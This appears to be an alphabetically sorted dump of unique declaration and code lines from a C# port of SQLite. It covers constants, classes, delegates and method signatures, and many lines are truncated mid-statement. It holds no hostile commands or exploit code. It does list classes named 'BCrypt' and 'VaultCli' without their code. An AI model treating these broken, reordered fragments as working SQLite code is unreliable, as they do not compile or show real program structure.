    const int etBUFSIZE = SQLITE_PRINT_BUF_SIZE
    const int etCHARX = 9
    const int etDYNSTRING = 7
    const int etEXP = 3
    const int etFLOAT = 2
    const int etGENERIC = 4
    const int etINVALID = 0
    const int etORDINAL = 16
    const int etPERCENT = 8
    const int etPOINTER = 14
    const int etRADIX = 1
    const int etSIZE = 5
    const int etSQLESCAPE = 10
    const int etSQLESCAPE2 = 11
    const int etSQLESCAPE3 = 15
    const int etSRCLIST = 13
    const int etSTRING = 6
    const int etTOKEN = 12
    const int tkCREATE = 4
    const int tkEND = 7
    const int tkEXPLAIN = 3
    const int tkOTHER = 2
    const int tkSEMI = 0
    const int tkTEMP = 5
    const int tkTRIGGER = 6
    const int tkWS = 1
    const u16 DB_Empty = 0x0004
    const u16 DB_SchemaLoaded = 0x0001
    const u16 DB_UnresetViews = 0x0002
    const u32 SQLITE_FCNTL_DB_UNCHANGED = 0xca093fa0
    const u32 SQLITE_MAX_U32 = (u32)( ( ( (u64)1 ) << 32 ) - 1 )
    const u32 VDBE_MAGIC_DEAD = 0xb606c3c8
    const u32 VDBE_MAGIC_HALT = 0x519c2973
    const u32 VDBE_MAGIC_INIT = 0x26bceaa5
    const u32 VDBE_MAGIC_RUN = 0xbdf20da3
    const u8 TRIGGER_AFTER = 2
    const u8 TRIGGER_BEFORE = 1
    const ushort EP2_Irreducible = 0x0002
    const ushort EP2_MallocedToken = 0x0001
    const ushort EP_Agg = 0x0002
    const ushort EP_AnyAff = 0x0200
    const ushort EP_DblQuoted = 0x0040
    const ushort EP_Distinct = 0x0010
    const ushort EP_Error = 0x0008
    const ushort EP_ExpCollate = 0x0100
    const ushort EP_FixedDest = 0x0400
    const ushort EP_FromJoin = 0x0001
    const ushort EP_InfixFunc = 0x0080
    const ushort EP_IntValue = 0x0800
    const ushort EP_Reduced = 0x2000
    const ushort EP_Resolved = 0x0004
    const ushort EP_Static = 0x8000
    const ushort EP_TokenOnly = 0x4000
    const ushort EP_VarSelect = 0x0020
    const ushort EP_xIsSelect = 0x1000
    database). This allows Trigger structures to be retrieved by name.
    db->aVTrans = 0
    db->aVTrans = aVTrans
    db->nVTrans = 0
    define SQLITE_ENABLE_LOCKING_STYLE 0
    define SQLITE_ENABLE_LOCKING_STYLE 1
    define SQLITE_MUTEX_NOOP
    define SQLITE_MUTEX_OS2
    define SQLITE_MUTEX_PTHREADS
    define SQLITE_MUTEX_W32
    do {
    dxCollNeeded xCollNeeded
    dxCompare xCompare
    dxDel freeProc//)(void
    dxDel xDel
    dxDel xDel              /
    dxDel xDel //void (
    dxDel xDel//)(void
    dxDel xDelete//void (
    dxDelCollSeq xDel  //void(
    dxDelCollSeq xDel//)(void
    dxFinal xFinal//)(sqlite3_context
    dxReiniter xReinit       /
    end
    end_allocate_page:
    end_insert:
    floating-point representation if an integer representation
    for(i=0
    for(iSrc=0
    for(j=0
    for(z=(unsigned char
    foreach row1 in t1 do
    freepage_out:
    goto pager_acquire_err
    i.  Data from middle columns...
    if ( nMax < (int)pgno 
    if ( pgno > PAGER_MAX_PGNO 
    if ( rc != SQLITE_OK )
    if( 
    if( !aVTrans ){
    if( IsVirtual(pTab) ){
    if( db->pVTab ){
    if( db2==db ){
    if( p ){
    if( pDel 
    if( pDel==pMod ){
    if( pEnd ){
    if( pOld ){
    if( pParse->pVdbe ){
    if( pTab==pParse->apVtabLock[i] ) return
    if( pVTab.pVtab.pModule.xRename==null ){
    if( pVtab 
    if( rc!=SQLITE_OK ){
    if( rc==SQLITE_OK ){
    if( zErr==0 ){
    insert into TABLE (IDLIST) select
    insert into TABLE (IDLIST) values(EXPRLIST)
    int (
    int NoErrors
    int allocSize
    int count                /
    int count          /
    int create          /
    int dequote            /
    int dequote           /
    int dummy /
    int eOp             /
    int enc
    int enc              /
    int esc                     /
    int flags           /
    int i
    int iBase                 /
    int iBreak             /
    int iContinue    /
    int iCur           /
    int iDb
    int iDbDest           /
    int iDepth
    int iMem           /
    int iMem         /
    int iStart         /
    int iTarget         /
    int idxTerm               /
    int ifNotExist    /
    int isBtreeCursor     /
    int isCommit             /
    int isExplain                 /
    int isRoot                     /
    int j
    int jumpIfNull    /
    int minusFlag     /
    int mx                 /
    int n = pParse->sArg.n
    int nArg
    int nBytes = sizeof(sqlite3_vtab 
    int nExpr           /
    int nExtraReg         /
    int nFunc           /
    int nMax = 0
    int nName = sqlite3Strlen30(zName)
    int noContent        /
    int noErr          /
    int noErr         /
    int noErr        /
    int nothing       /
    int offset        /
    int onError           /
    int onError        /
    int op          /
    int opcode      /
    int orconfin              /
    int regData           /
    int resetFlag        /
    int seekResult                 /
    int sortOrder   /
    int sqlite3_db_status(
    int sqlite3_os_type = 0
    int syncDir               /
    int szSpace         /
    int useType
    int vfsFlags            /
    int yyruleno                 /
    int[] aRegIdx       /
    int[] aSize       /
    is not possible.  Note that the integer representation is
    localtime
    mem[iMem
    mem[iMem]:             The total number of rows in the table.
    memset(
    meta[0]   Schema cookie.  Changes with each schema change.
    meta[1]   File format of schema layer.
    meta[2]   Size of the page cache.
    meta[3]   Largest rootpage (auto/incr_vacuum mode)
    meta[4]   Db text encoding. 1:UTF-8 2:UTF-16LE 3:UTF-16BE
    meta[5]   User version
    meta[6]   Incremental vacuum mode
    meta[7]   unused
    meta[8]   unused
    meta[9]   unused
    moveto_finish:
    null                         /
    object pArg
    object pArg             /
    object pBusyHandlerArg                /
    op              The opcode for this instruction
    outA:    Move the output of the selectA coroutine into the output
    outA: output one row of A
    outB:    Move the output of the selectB coroutine into the output
    outB: output one row of B (UNION and UNION ALL only)
    p               Pointer to the VDBE
    pArg->n = (int)(
    pArg->n = p->n
    pArg->z = p->z
    pDel = (Module 
    pExpr->iColumn       Set to the column number within the table.
    pExpr->iDb           Set the index in db->aDb[] of the database X
    pExpr->iTable        Set to the cursor number for the table obtained
    pExpr->op            Set to TK_COLUMN.
    pExpr->pLeft         Any expression this points to is deleted
    pExpr->pRight        Any expression this points to is deleted.
    pExpr->pTab          Points to the Table structure of X.Y (even if
    pMod->pAux = pAux
    pMod->pModule = pModule
    pMod->xDestroy = xDestroy
    pMod->zName = zCopy
    pNext member of struct Trigger. A pointer to the first element of the
    pOld = sqlite3HashInsert(
    pParse->apVtabLock = apVtabLock
    pParse->apVtabLock[pParse->nVtabLock
    pParse->db = db
    pParse->db->mallocFailed = 1
    pParse->declareVtab = 0
    pParse->declareVtab = 1
    pParse->pNewTable = 0
    pPg = null
    pPg = ppPage
    pPg.pExtra = new MemPage()
    pPg.pPager = pPager
    pSchema->db = pParse->db
    pTable->nModuleArg = 0
    pVTable = pNext
    pVTable->nRef = 1
    pVTable->pVtab->pModule = pMod->pModule
    page1_init_failed:
    params object[] ap
    pragma_out:
    private Vdbe vm = null
    private class LockingStrategy
    private class MediumTrustLockingStrategy : LockingStrategy
    private int LastResult = 0
    private static LockingStrategy lockingStrategy = HelperMethods.IsRunningMediumTrust() 
    processing will occur until three tokens have been
    ptrmap_exit:
    public Vdbe VirtualMachine()
    public class AggInfo
    public class AggInfo_col
    public class AggInfo_func
    public class AuthContext
    public class AutoincInfo
    public class AuxData
    public class Bitvec
    public class BtCursor
    public class BtLock {
    public class BtShared
    public class Btree
    public class BtreeMutexArray
    public class BusyHandler
    public class CollSeq
    public class Column
    public class Context
    public class CountCtx
    public class DateTime
    public class Db
    public class DbFixer
    public class Edge
    public class Expr
    public class ExprList
    public class ExprList_item
    public class ExprSpan
    public class FKey
    public class FileChunk
    public class FilePoint
    public class FuncDef
    public class FuncDefHash
    public class Hash
    public class HashElem
    public class IdList
    public class IdList_item
    public class InLoop
    public class Index
    public class InitData
    public class IntegrityCk
    public class KeyInfo
    public class Lookaside
    public class LookasideSlot
    public class Mem
    public class Mem0Global
    public class MemPage
    public class Module
    public class NameContext
    public class PCache
    public class PCache1
    public class PCacheGlobal
    public class Pager
    public class PagerSavepoint
    public class Parse
    public class PgFreeslot
    public class PgHdr
    public class PgHdr1
    public class RowSet
    public class RowSetChunk
    public class RowSetEntry
    public class SQLiteDatabase
    public class Savepoint
    public class Schema
    public class Select
    public class SelectDest
    public class Set
    public class Sqlite3Config
    public class SrcList
    public class SrcList_item
    public class StrAccum
    public class SumCtx
    public class Table
    public class Token
    public class Trigger
    public class TriggerStack
    public class TriggerStep
    public class UnpackedRecord
    public class VTable
    public class Vdbe
    public class VdbeCursor
    public class VdbeFunc : FuncDef
    public class VdbeOp
    public class Walker
    public class WhereAndInfo
    public class WhereClause
    public class WhereCost
    public class WhereInfo
    public class WhereLevel
    public class WhereMaskSet
    public class WhereOrInfo
    public class WherePlan
    public class WhereTerm
    public class YYMINORTYPE
    public class _ht
    public class _u
    public class et_info
    public class sqlite3
    public class sqlite3AutoExtList
    public class sqlite3PrngType
    public class sqlite3StatType
    public class sqlite3_api_routines
    public class sqlite3_backup
    public class sqlite3_context
    public class sqlite3_index_constraint
    public class sqlite3_index_constraint_usage
    public class sqlite3_index_info
    public class sqlite3_index_orderby
    public class sqlite3_io_methods
    public class sqlite3_module
    public class sqlite3_mutex { }
    public class sqlite3_mutex_methods
    public class sqlite3_pcache_methods
    public class sqlite3_vfs
    public class sqlite3_vtab_cursor
    public class union_p4
    public class yColCache
    public class yyParser
    public class yyStackEntry
    public class yymsp
    public const int NB = (NN 
    public const int NN = 1
    public const int SQLITE_ABORT = 4
    public const int SQLITE_AUTH = 23
    public const int SQLITE_BUSY = 5
    public const int SQLITE_CANTOPEN = 14
    public const int SQLITE_CONSTRAINT = 19
    public const int SQLITE_CORRUPT = 11
    public const int SQLITE_DONE = 101
    public const int SQLITE_EMPTY = 16
    public const int SQLITE_ERROR = 1
    public const int SQLITE_FORMAT = 24
    public const int SQLITE_FULL = 13
    public const int SQLITE_INTERNAL = 2
    public const int SQLITE_INTERRUPT = 9
    public const int SQLITE_IOERR = 10
    public const int SQLITE_LIMIT_ATTACHED = 7
    public const int SQLITE_LIMIT_COLUMN = 2
    public const int SQLITE_LIMIT_COMPOUND_SELECT = 4
    public const int SQLITE_LIMIT_EXPR_DEPTH = 3
    public const int SQLITE_LIMIT_FUNCTION_ARG = 6
    public const int SQLITE_LIMIT_LENGTH = 0
    public const int SQLITE_LIMIT_LIKE_PATTERN_LENGTH = 8
    public const int SQLITE_LIMIT_SQL_LENGTH = 1
    public const int SQLITE_LIMIT_VARIABLE_NUMBER = 9
    public const int SQLITE_LIMIT_VDBE_OP = 5
    public const int SQLITE_LOCKED = 6
    public const int SQLITE_MISMATCH = 20
    public const int SQLITE_MISUSE = 21
    public const int SQLITE_NOLFS = 22
    public const int SQLITE_NOMEM = 7
    public const int SQLITE_NOTADB = 26
    public const int SQLITE_NOTFOUND = 12
    public const int SQLITE_OK = 0
    public const int SQLITE_OPEN_CREATE = 0x00000004
    public const int SQLITE_OPEN_DELETEONCLOSE = 0x00000008
    public const int SQLITE_OPEN_EXCLUSIVE = 0x00000010
    public const int SQLITE_OPEN_FULLMUTEX = 0x00010000
    public const int SQLITE_OPEN_MAIN_DB = 0x00000100
    public const int SQLITE_OPEN_MAIN_JOURNAL = 0x00000800
    public const int SQLITE_OPEN_MASTER_JOURNAL = 0x00004000
    public const int SQLITE_OPEN_NOMUTEX = 0x00008000
    public const int SQLITE_OPEN_READONLY = 0x00000001
    public const int SQLITE_OPEN_READWRITE = 0x00000002
    public const int SQLITE_OPEN_SUBJOURNAL = 0x00002000
    public const int SQLITE_OPEN_TEMP_DB = 0x00000200
    public const int SQLITE_OPEN_TEMP_JOURNAL = 0x00001000
    public const int SQLITE_OPEN_TRANSIENT_DB = 0x00000400
    public const int SQLITE_PERM = 3
    public const int SQLITE_PROTOCOL = 15
    public const int SQLITE_RANGE = 25
    public const int SQLITE_READONLY = 8
    public const int SQLITE_ROW = 100
    public const int SQLITE_SCHEMA = 17
    public const int SQLITE_TOOBIG = 18
    public const u8 SQLITE3_TEXT = 3
    public const u8 SQLITE_ANY = 5
    public const u8 SQLITE_BLOB = 4
    public const u8 SQLITE_FLOAT = 2
    public const u8 SQLITE_INTEGER = 1
    public const u8 SQLITE_NULL = 5
    public const u8 SQLITE_TEXT = 3
    public const u8 SQLITE_UTF16 = 4
    public const u8 SQLITE_UTF16BE = 3
    public const u8 SQLITE_UTF16LE = 2
    public const u8 SQLITE_UTF16_ALIGNED = 8
    public const u8 SQLITE_UTF8 = 1
    public delegate  int dxPC_Pagecount (sqlite3_pcache pCache)
    public delegate  void dxPC_Destroy(ref sqlite3_pcache pCache)
    public delegate byte[] dxMalloc (int nSize)
    public delegate int  dxSize (byte[] pArray)
    public delegate int dmxBegin(sqlite3_vtab pVTab)
    public delegate int dmxClose(sqlite3_vtab_cursor pCursor)
    public delegate int dmxCommit(sqlite3_vtab pVTab)
    public delegate int dmxDestroy(sqlite3_vtab pVTab)
    public delegate int dmxDisconnect(sqlite3_vtab pVTab)
    public delegate int dmxEof(sqlite3_vtab_cursor pCursor)
    public delegate int dmxNext(sqlite3_vtab_cursor pCursor)
    public delegate int dmxRollback(sqlite3_vtab pVTab)
    public delegate int dmxSync(sqlite3_vtab pVTab)
    public delegate int dxBusyHandler( object pBusyHandlerArg )
    public delegate int dxClose( sqlite3_file File_ID )
    public delegate int dxCommitCallback( object pCommitArg )
    public delegate int dxDeviceCharacteristics( sqlite3_file File_ID )
    public delegate int dxFuncBtree( Btree p )
    public delegate int dxMemInit (object o)
    public delegate int dxPC_Init( object NotUsed )
    public delegate int dxProgress( object pProgressArg )
    public delegate int dxRoundup( int nSize )
    public delegate int dxSectorSize( sqlite3_file File_ID )
    public delegate int smdxBegin( sqlite3_vtab pVTab )
    public delegate int smdxClose( sqlite3_vtab_cursor pCursor )
    public delegate int smdxCommit( sqlite3_vtab pVTab )
    public delegate int smdxDestroy( sqlite3_vtab pVTab )
    public delegate int smdxDisconnect( sqlite3_vtab pVTab )
    public delegate int smdxEof( sqlite3_vtab_cursor pCursor )
    public delegate int smdxNext( sqlite3_vtab_cursor pCursor )
    public delegate int smdxRollback( sqlite3_vtab pVTab )
    public delegate int smdxSync( sqlite3_vtab pVTab )
    public delegate string dxColname( sqlite3_value pVal )
    public delegate void dxDel ( ref string pDelArg )
    public delegate void dxDelCollSeq( ref object pDelArg )
    public delegate void dxDestroy( ref PgHdr pDestroyArg )
    public delegate void dxDestructor( DbPage dbPage)
    public delegate void dxFinal( sqlite3_context ctx )
    public delegate void dxFree( ref byte[]  pOld)
    public delegate void dxFreeAux( object pAuxArg )
    public delegate void dxFreeSchema( Schema schema )
    public delegate void dxIter(PgHdr p)
    public delegate void dxMemShutdown( object o )
    public delegate void dxPC_Shutdown( object NotUsed )
    public delegate void dxReiniter( DbPage dbPage )
    public delegate void dxRollbackCallback( object pRollbackArg )
    public delegate void void_function()
    public int ExecuteStep(   )
    public int ResultColumnCount( )
    public long Result_Long(int index)
    public partial class sqlite3_file
    public static System.DateTime ToCSharpTime( long unixTime )
    public static bool IsRunningMediumTrust()
    public static byte[] sqlite3_value_blob( sqlite3_value pVal )
    public static class BCrypt
    public static class VaultCli
    public static double sqlite3_value_double( sqlite3_value pVal )
    public static dxDel SQLITE_STATIC
    public static dxDel SQLITE_TRANSIENT
    public static extern bool GetSystemTimeAsFileTime( ref FILETIME sysfiletime )
    public static int GetbytesPerSector( StringBuilder diskPath )
    public static int MX_CLOSE_ATTEMPT = 3
    public static int SQLITE_MAX_FILE_FORMAT = 4
    public static int sqlite3_backup_finish( sqlite3_backup p )
    public static int sqlite3_bind_blob(
    public static int sqlite3_bind_text(
    public static int sqlite3_changes( sqlite3 db )
    public static int sqlite3_close( sqlite3 db )
    public static int sqlite3_column_count( sqlite3_stmt pStmt )
    public static int sqlite3_complete( string zSql )
    public static int sqlite3_create_function(
    public static int sqlite3_data_count( sqlite3_stmt pStmt )
    public static int sqlite3_errcode( sqlite3 db )
    public static int sqlite3_exec(
    public static int sqlite3_finalize( ref sqlite3_stmt pStmt )
    public static int sqlite3_get_table(
    public static int sqlite3_libversion_number() { return SQLITE_VERSION_NUMBER
    public static int sqlite3_load_extension(
    public static int sqlite3_open(
    public static int sqlite3_open_v2(
    public static int sqlite3_prepare(
    public static int sqlite3_prepare_v2(
    public static int sqlite3_reset( sqlite3_stmt pStmt )
    public static int sqlite3_sleep( int ms )
    public static int sqlite3_step( sqlite3_stmt pStmt )
    public static int sqlite3_threadsafe() { return SQLITE_THREADSAFE
    public static int sqlite3_total_changes( sqlite3 db )
    public static int sqlite3_value_bytes( sqlite3_value pVal )
    public static int sqlite3_value_bytes16( sqlite3_value pVal )
    public static int sqlite3_value_int( sqlite3_value pVal )
    public static int sqlite3_value_type( sqlite3_value pval )
    public static int[] OPFLG_INITIALIZER = new int[]{
    public static long ToUnixtime( System.DateTime date )
    public static sqlite3PrngType sqlite3Prng = new sqlite3PrngType()
    public static sqlite3StatType sqlite3Stat = new sqlite3StatType()
    public static sqlite3_backup sqlite3_backup_init(
    public static sqlite_int64 sqlite3_last_insert_rowid( sqlite3 db )
    public static sqlite_int64 sqlite3_value_int64( sqlite3_value pVal )
    public static string sqlite3_errmsg( sqlite3 db )
    public static string sqlite3_libversion() { return sqlite3_version
    public static string sqlite3_value_text( sqlite3_value pVal )
    public static string sqlite3_version = SQLITE_VERSION
    public static tm localtime( time_t baseTime )
    public static void sqlite3_result_blob(
    public static void sqlite3_result_text(
    public string Result_Text( int index )
    public struct AttachKey { public int type
    public struct BenignMallocHooks//
    public struct CellInfo
    public struct FILETIME
    public struct LikeOp
    public struct LimitVal
    public struct TrigEvent { public int a
    public struct VdbeOpList
    public struct _OvflCell
    public struct _yyRuleInfo
    public struct analysisInfo
    public struct sAggs
    public struct sFuncs
    public struct sqlite3_mem_methods
    public struct sqlite3_vtab
    public struct tm
    public void Close()
    public void Reset()
    rc =  sqlite3GlobalConfig.mutex.xMutexInit()
    rc = SQLITE_ERROR
    rc = SQLITE_NOMEM
    rc = p->pMod->pModule->xDestroy(p->pVtab)
    rc = pModule->xBegin(pVTab->pVtab)
    rc = pPager.errCode
    rc = rcsafety
    rc = sqlite3SafetyOff(db)
    ref  DateTime p
    ref Btree ppBtree     /
    ref CellInfo pInfo         /
    ref CellInfo pInfo        /
    ref Column[] paCol          /
    ref DateTime p
    ref DbPage ppPage   /
    ref Expr pExpr         /
    ref MemPage ppPage     /
    ref PgHdr ppPage     /
    ref Pgno pPgnoNext          /
    ref RowSetEntry ppLast      /
    ref SelectDest pDest /
    ref Token pUnqual  /
    ref WhereCost pCost            /
    ref WhereCost pCost         /
    ref bool pnoCase      /
    ref int pFlagsOut
    ref int pFreeRight   /
    ref int pIdx      /
    ref int pMask          /
    ref int pOutFlags
    ref int pOutFlags       /
    ref int pRC         /
    ref int pRes             /
    ref int pRes       /
    ref int pResOut         /
    ref int pbMayReplace   /
    ref int pbRev          /
    ref int pnChange
    ref int pnErr  /
    ref int pnRecyclable    /
    ref int pnSize            /
    ref int res                 /
    ref sqlite3 ppDb
    ref sqlite3_value ppVal     /
    ref string pzErrMsg         /
    ref string pzErrMsg   /
    ref string pzErrMsg  /
    ref string pzErrmsg     /
    ref string pzNext   /
    ref string pzOriginCol
    ref string pzTail         /
    ref u32 pDbSize             /
    ref u32 piNewColMask /
    return SQLITE_LOCKED
    return SQLITE_MISUSE
    return SQLITE_NOMEM
    return SQLITE_OK
    return pDef
    set_child_ptrmaps_out:
    shifted successfully.
    sqlite3 
    sqlite3DeleteTable(pParse->pNewTable)
    sqlite3ExpirePreparedStatements(db)
    sqlite3ParserARG_FETCH     Code to extract %extra_argument from yypParser
    sqlite3ParserARG_PDECL     A parameter declaration for the %extra_argument
    sqlite3ParserARG_SDECL     A static variable declaration for the %extra_argument
    sqlite3ParserARG_STORE     Code to store %extra_argument into yypParser
    sqlite3ParserTOKENTYPE     is the data type used for minor tokens given
    sqlite3ParserTOKENTYPE yyminor  /
    sqlite3_int64 iOfst    /
    sqlite3_int64 iOfst   /
    sqlite3_int64 iThreshold
    sqlite3_int64 offset       /
    sqlite3_int64 offset      /
    sqlite3_mutex sqlite3_db_mutex( sqlite3 db )
    sqlite3_mutex_leave(db->mutex)
    sqlite3_value[] NotUsed2
    sqlite3_value[] NotUsed2       /
    sqlite3_value[] argv
    sqlite3_vtab 
    start of TTTTT
    static BenignMallocHooks wsdHooks = sqlite3Hooks
    static Bitmask codeOneLoopStart(
    static Bitvec sqlite3BitvecCreate( u32 iSize )
    static CollSeq sqlite3BinaryCompareCollSeq(
    static CollSeq sqlite3FindCollSeq(
    static CollSeq sqlite3GetCollSeq(
    static CollSeq sqlite3GetFuncCollSeq( sqlite3_context context )
    static CollSeq[] findCollSeqEntry(
    static Expr sqlite3Expr(
    static Expr sqlite3ExprAlloc(
    static Expr sqlite3PExpr(
    static Expr substExpr(
    static ExprList sqlite3ExprListAppend(
    static FuncDef functionSearch(
    static FuncDef sqlite3FindFunction(
    static FuncDefHash sqlite3GlobalFunctions
    static HashElem findElementGivenHash(
    static HashElem sqliteHashFirst( Hash H ) { return H.first
    static HashElem sqliteHashNext( HashElem E ) { return E.next
    static MemPage sqlite3PagerGetExtra( DbPage pPg )
    static PCacheGlobal pcache = new PCacheGlobal()
    static PCacheGlobal pcache1 = pcache
    static Pager sqlite3BtreePager(Btree p)
    static PgHdr PGHDR1_TO_PAGE( PgHdr1 p ) { return p.pPgHdr
    static PgHdr pcache1Alloc( int nByte )
    static PgHdr pcacheSortDirtyList( PgHdr pIn )
    static PgHdr sqlite3PageMalloc( int sz )
    static PgHdr sqlite3PcacheDirtyList( PCache pCache )
    static PgHdr1 pcache1AllocPage( PCache1 pCache )
    static Pgno PAGER_MJ_PGNO( Pager x ) { return ( (Pgno)( ( PENDING_BYTE / ( ( x ).pageSize ) ) 
    static Pgno pagerPagecount(BtShared pBt)
    static Pgno sqlite3PagerPagenumber( DbPage pPg )
    static RowSetEntry rowSetListToTree( RowSetEntry pList )
    static RowSetEntry rowSetMerge(
    static RowSetEntry rowSetNDeepTree(
    static Select sqlite3SelectNew(
    static SelectDest sdDummy = null
    static Sqlite3Config sqlite3Config = new Sqlite3Config(
    static Sqlite3Config sqlite3GlobalConfig
    static SrcList sqlite3SrcListAppend(
    static SrcList sqlite3SrcListAppendFromTerm(
    static SrcList sqlite3SrcListEnlarge(
    static SrcList targetSrcList(
    static T[] sqlite3ArrayAllocate<T>(
    static Table sqlite3LocateTable(
    static Table tableOfTrigger( Trigger pTrigger )
    static TextWriter yyTraceFILE = null
    static Trigger sqlite3TriggersExist(
    static TriggerStep sqlite3TriggerDeleteStep(
    static TriggerStep sqlite3TriggerInsertStep(
    static TriggerStep sqlite3TriggerUpdateStep(
    static TriggerStep triggerStepAllocate(
    static UnpackedRecord sqlite3VdbeRecordUnpack(
    static Vdbe sqlite3GetVdbe( Parse pParse )
    static Vdbe sqlite3VdbeCreate( sqlite3 db )
    static VdbeCursor allocateCursor(
    static WhereInfo sqlite3WhereBegin(
    static WhereTerm findTerm(
    static YYACTIONTYPE[] yy_action = new YYACTIONTYPE[]{
    static YYACTIONTYPE[] yy_default = new YYACTIONTYPE[] {
    static YYCODETYPE[] yyFallback = new YYCODETYPE[]{
    static YYCODETYPE[] yy_lookahead = new YYCODETYPE[]{
    static _yyRuleInfo[] yyRuleInfo = new _yyRuleInfo[]{
    static bool ALWAYS( bool X ) { if ( X != true ) Debug.Assert( false )
    static bool ALWAYS(bool X) { return X
    static bool ALWAYS<T>( T X ) { if ( X == null ) Debug.Assert( false )
    static bool IN_DECLARE_VTAB = false
    static bool IdChar( u8 C ) { u8 c
    static bool IsHiddenColumn( Column C ) { return false
    static bool IsVirtual( Table T ) { return false
    static bool NEVER( bool X ) { if ( X == true ) Debug.Assert( false )
    static bool NEVER<T>( T X ) { if ( X != null ) Debug.Assert( false )
    static bool SimulateDiskfullError()
    static bool SimulateIOError()
    static bool allowedOp( int op )
    static bool assert_pager_state( Pager pPager )
    static bool assert_pager_state(Pager pPager) { return true
    static bool bDummy = false
    static bool checkForMultiColumnSelectError(
    static bool cursorHoldsMutex(BtCursor p)
    static bool isFatalError( int rc )
    static bool isInit = false
    static bool isNT()
    static bool isOpen( sqlite3_file pFd ) { return pFd.pMethods != null
    static bool isSortingIndex(
    static bool likely( bool X ) { return !!X
    static bool pageInJournal( PgHdr pPg )
    static bool patternCompare(
    static bool referencesOtherTables(
    static bool removeFromSharingList(BtShared pBt)
    static bool sortableByRowid(
    static bool sqlite3BtreeCursorIsValid(BtCursor pCur)
    static bool sqlite3BtreeEof(BtCursor pCur)
    static bool sqlite3BtreeHoldsAllMutexes( sqlite3 X ) { return true
    static bool sqlite3BtreeHoldsMutex( Btree X ) { return true
    static bool sqlite3BtreeIsInBackup(Btree p)
    static bool sqlite3BtreeIsInReadTrans(Btree p)
    static bool sqlite3BtreeIsInTrans(Btree p)
    static bool sqlite3IsMemJournal( sqlite3_file pJfd )
    static bool sqlite3IsNaN( double x )
    static bool sqlite3IsRowid( string z )
    static bool sqlite3Isalnum( byte x ) { return ( sqlite3CtypeMap[(byte)( x )] 
    static bool sqlite3Isalnum( char x ) { return x < 256 
    static bool sqlite3Isdigit( byte x ) { return ( sqlite3CtypeMap[( (byte)x )] 
    static bool sqlite3Isdigit( char x ) { return x < 256 
    static bool sqlite3Isspace( byte x ) { return ( sqlite3CtypeMap[(byte)( x )] 
    static bool sqlite3Isspace( char x ) { return x < 256 
    static bool sqlite3Isxdigit( byte x ) { return ( sqlite3CtypeMap[( (byte)x )] 
    static bool sqlite3Isxdigit( char x ) { return x < 256 
    static bool sqlite3OsTrace = false
    static bool sqlite3PagerIsMemdb( Pager pPager )
    static bool sqlite3PagerIsreadonly( Pager pPager )
    static bool sqlite3PagerIswriteable( DbPage pPg )
    static bool sqlite3PagerNosync( Pager pPager )
    static bool sqlite3PagerTrace = false
    static bool sqlite3SafetyCheckOk( sqlite3 db )
    static bool sqlite3SafetyCheckSickOrOk( sqlite3 db )
    static bool sqlite3SafetyOff( sqlite3 db )
    static bool sqlite3SafetyOn( sqlite3 db )
    static bool sqlite3TempInMemory( sqlite3 db )
    static bool sqlite3VdbeAddopTrace = false
    static bool sqlite3VdbeMemTooBig( Mem p )
    static bool sqlite3VtabInSync( sqlite3 db ) { return false
    static bool sqlite3WhereTrace = false
    static bool sqlite3_mutex_held( sqlite3_mutex m ) { return true
    static bool sqlite3_mutex_notheld( sqlite3_mutex m ) { return true
    static bool subjRequiresPage( PgHdr pPg )
    static bool unlikely( bool X ) { return !!X
    static bool[] sqlite3IsAsciiIdChar = {
    static byte ALWAYS(byte X) { return X
    static byte NEVER( byte X ) { if ( X != 0 ) Debug.Assert( false )
    static byte[] aJournalMagic = new byte[] {
    static byte[] fetchPayload(
    static byte[] sqlite3CtypeMap = new byte[] {
    static byte[] sqlite3Malloc( int n )
    static byte[] sqlite3MallocZero( int n )
    static byte[] sqlite3MemMalloc( int nByte )
    static byte[] sqlite3PagerGetData( DbPage pPg )
    static byte[] sqlite3PagerTempSpace( Pager pPager )
    static byte[] sqlite3Utf8Trans1 = new byte[]  {
    static byte[] sqlite3_malloc( int n )
    static char comparisonAffinity( Expr pExpr )
    static char sqlite3AffinityType( string zIn )
    static char sqlite3ExprAffinity( Expr pExpr )
    static char[] hexdigits = new char[]  {
    static compareInfo globInfo = new compareInfo( '
    static double estLog( double N )
    static double sqlite3VdbeRealValue( Mem pMem )
    static dxDel SQLITE_DYNAMIC
    static et_info[] fmtinfo = new et_info[] {
    static i64 doubleToInt64( double r )
    static i64 journalHdrOffset( Pager pPager )
    static i64 sqlite3VdbeIntValue( Mem pMem )
    static int ADDR( int x ) { return -1 - x
    static int ALWAYS( int X ) { if ( X == 0 ) Debug.Assert( false )
    static int ALWAYS(int X) { return X
    static int ArraySize<T>( T[] x ) { return x.Length
    static int ExpandBlob( Mem P ) { return ( P.flags 
    static int FILEHANDLEID( sqlite3_file fd ) { return fd.GetHashCode()
    static int JOURNAL_PG_SZ( Pager pPager )
    static int MX_CELL( BtShared pBt ) { return ( ( pBt.pageSize - 8 ) / 6 )
    static int MX_CELL_SIZE( BtShared pBt ) { return ( pBt.pageSize - 8 )
    static int MX_DELETION_ATTEMPTS = 5
    static int NEVER( int X ) { if ( X != 0 ) Debug.Assert( false )
    static int OMIT_TEMPDB = 0
    static int PAGERID( Pager p ) { return p.GetHashCode()
    static int PAGER_LOCKINGMODE_EXCLUSIVE = 1
    static int PAGER_LOCKINGMODE_NORMAL = 0
    static int PAGER_LOCKINGMODE_QUERY = -1
    static int PENDING_BYTE = 0x40000000
    static int RESERVED_BYTE = ( PENDING_BYTE 
    static int ROUND8( int x ) { return ( x 
    static int ROUNDDOWN8( int x ) { return x 
    static int SHARED_FIRST = ( PENDING_BYTE 
    static int SHARED_SIZE = 510
    static int SQLITE_CORRUPT_BKPT()
    static int SQLITE_DEFAULT_FILE_FORMAT = 1
    static int SQLITE_TEMP_STORE = 1
    static int YY_SZ_ACTTAB = yy_action.Length
    static int accessPayload(
    static int allocateBtreePage(
    static int atoi( byte[] inStr )
    static int atoi( string inStr )
    static int autoIncBegin(
    static int autoVacuumCommit(BtShared pBt)
    static int balance(BtCursor pCur)
    static int balance_nonroot(
    static int binCollFunc(
    static int bindText(
    static int btreeCursor(
    static int btreeGetPage(
    static int btreeInitPage(MemPage pPage)
    static int btreeInvokeBusyHandler(object pArg)
    static int btreeMoveto(
    static int btreeRestoreCursorPosition(BtCursor pCur)
    static int checkSavepointCount( sqlite3 db )
    static int checkTreePage(
    static int clearDatabasePage(
    static int codeAllEqualityTerms(
    static int codeCompare(
    static int codeEqualityTerm(
    static int codeTriggerProgram(
    static int compare2pow63( string zNum )
    static int copyPayload(
    static int countWriteCursors(BtShared pBt)
    static int createCollation(
    static int defragmentPage(MemPage pPage)
